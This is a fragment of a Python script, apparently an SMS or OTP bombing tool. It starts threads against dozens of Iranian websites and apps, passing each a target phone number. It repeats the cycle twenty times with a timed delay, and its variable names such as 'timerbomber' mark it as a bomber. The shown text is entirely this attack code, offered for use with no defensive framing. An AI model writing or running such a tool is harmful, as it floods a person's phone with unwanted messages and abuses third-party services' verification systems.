            Thread(target=taghche, args=[phone]).start(), sleep(Time)
            Thread(target=tagmond, args=[phone]).start(), sleep(Time)
            Thread(target=tajtehran, args=[phone]).start(), sleep(Time)
            Thread(target=tak, args=[phone]).start(), sleep(Time)
            Thread(target=takfarsh, args=[phone]).start(), sleep(Time)
            Thread(target=takshopaccessorise, args=[phone]).start(), sleep(Time)
            Thread(target=tapsi, args=[phone]).start(), sleep(Time)
            Thread(target=tezolmarket, args=[phone]).start(), sleep(Time)
            Thread(target=threetex, args=[phone]).start(), sleep(Time)
            Thread(target=tikban, args=[phone]).start(), sleep(Time)
            Thread(target=timcheh, args=[phone]).start(), sleep(Time)
            Thread(target=tj8, args=[phone]).start(), sleep(Time)
            Thread(target=tnovin, args=[phone]).start(), sleep(Time)
            Thread(target=topnoor, args=[phone]).start(), sleep(Time)
            Thread(target=torob, args=[phone]).start(), sleep(Time)
            Thread(target=trip, args=[phone]).start(), sleep(Time)
            Thread(target=virgool, args=[phone]).start(), sleep(Time)
            Thread(target=wideapp, args=[phone]).start(), sleep(Time)
            Thread(target=wisgoon, args=[phone]).start(), sleep(Time)
            Thread(target=zoodex, args=[phone]).start(), sleep(Time)

        r=''
        g='\033[32;1m' 
        y='\033[1;33m'
        w='\033[1;37m'

        while True:
            phone = is_phone(numberphone)
            if phone:
                break
        Time = float(timerbomber)
        for i in range(20):
            try: Vip(phone, Time)
            except: print_bomb(f'er')
        exit()
    phone_aaa(numberphone_AAA , timerbomber_AAA)
